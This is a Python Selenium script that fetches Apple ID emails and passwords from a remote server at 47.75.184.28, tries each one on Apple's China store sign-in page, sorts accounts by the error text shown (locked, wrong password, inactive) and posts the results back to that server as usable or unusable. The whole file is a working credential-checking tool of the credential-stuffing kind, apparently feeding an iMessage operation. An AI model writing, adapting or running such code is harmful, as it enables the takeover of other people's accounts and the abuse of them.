# encoding: utf-8

from selenium import webdriver
import selenium
import time
import requests
from selenium.webdriver.support.wait import WebDriverWait


class filter():
    ul = 'https://secure2.store.apple.com/cn/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL2NuL2l0dW5lcy98MWFvczY2ZGQ4YjJlYzI0MmNmZmVjZWM1MmMxYTU5ZDI5OGY1NGJmZTA0NDA&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL2NuL2l0dW5lcy98MWFvczY2ZGQ4YjJlYzI0MmNmZmVjZWM1MmMxYTU5ZDI5OGY1NGJmZTA0NDA'
    def setUp(self):
        options = webdriver.ChromeOptions()
        options.binary_location = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
        chrome_driver_binary = "C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe"
        self.driver = webdriver.Chrome(chrome_driver_binary, options=options)
        # ul = 'https://secure2.store.apple.com/cn/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL2NuL2l0dW5lcy98MWFvczY2ZGQ4YjJlYzI0MmNmZmVjZWM1MmMxYTU5ZDI5OGY1NGJmZTA0NDA&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL2NuL2l0dW5lcy98MWFvczY2ZGQ4YjJlYzI0MmNmZmVjZWM1MmMxYTU5ZDI5OGY1NGJmZTA0NDA'
        self.driver.get(self.ul)

    def quit(self):
        self.driver.quit()

    def uplaod_Unuseble(self,accout):
        textmob = {"email": accout}
        # textmob = parse.urlencode(textmob).encode(encoding='utf-8')
        # req = request.Request(url="http://www.aabapi.top/imessage-restapi/appleid/updateCheckErrorMail",data=textmob)
        # res = request.urlopen(req)
        # res = res.read()
        req = requests.post(url="http://47.75.184.28/api/imessage-server/imessage-restapi/appleid/updateCheckErrorMail",data=textmob)
        print(req)

    def uplaod_Usable(self,accout):
        textmob = {"email": accout}
        req = requests.post(url="http://47.75.184.28/api/imessage-server/imessage-restapi/appleid/updateCheckSucceedMail", data=textmob)
        print(req)

    def verify(self):
        url = "http://47.75.184.28/api/imessage-server/imessage-restapi/appleid/getCheckAccount"
        r = requests.get(url)
        result = r.json()
        print(result)
        accout = result["email"]
        password = result["password"]
        WebDriverWait(self.driver, 10).until(lambda the_driver: the_driver.find_element_by_id('loginHome.customerLogin.appleId').is_displayed(), '失败')
        # account_id = driver.find_element_by_id("loginHome.customerLogin.appleId")
        account_id = self.driver.find_element_by_xpath("//input[@id='loginHome.customerLogin.appleId']")
        account_name = account_id.send_keys(accout)
        self.driver.find_element_by_id("loginHome.customerLogin.password").send_keys(password)
        time.sleep(1)
        self.driver.find_element_by_class_name('button.button-block.form-button').click()
        time.sleep(2)
        info = self.driver.find_elements_by_class_name("form-alert.is-error")
        MessA = "出于安全原因，此 Apple ID 已被锁定。请访问 iForgot 以重设您的帐户 (https://iforgot.apple.com)。"
        MessB = "你输入的 Apple ID 或密码不正确。请在下方重新设置密码。"
        MessC = "您的 Apple ID 或密码输入有误。"
        MessD = "这个人不在激活状态。"
        if info:
            for content in info:
                alertInfo = content.text
                if alertInfo == MessA :
                    print("Unusable: "+accout)
                    self.uplaod_Unuseble(accout)
                    self.driver.find_element_by_id("loginHome.customerLogin.appleId").clear()
                    time.sleep(2)

                elif alertInfo == MessB:
                    print("AccountError: "+accout)
                    self.uplaod_Unuseble(accout)
                    self.driver.find_element_by_class_name("as-buttonlink").click()
                    time.sleep(2)
                    self.driver.find_element_by_id("loginHome.customerLogin.appleId").clear()
                    time.sleep(2)

                elif alertInfo == MessC or alertInfo == MessD:
                    print("AccountError: "+accout)
                    self.uplaod_Unuseble(accout)
                    self.driver.find_element_by_id("loginHome.customerLogin.appleId").clear()
                    time.sleep(2)

        else:
            # print(accout)
            # with open('usableAccouts.txt','a+') as f :
            #     f.write(accout)
            #     f.write("\n")
            print("UsableAccount: " + accout)
            self.uplaod_Usable(accout)
            self.driver.get(self.ul)
            time.sleep(2)
            self.driver.find_element_by_id("loginHome.customerLogin.appleId").clear()
            time.sleep(2)


if __name__ == "__main__":

        F =filter()
        F.setUp()
        # F.verify()
        while 1:
            try:
                F.verify()
            except:
                F.quit()

                F.setUp()

                continue


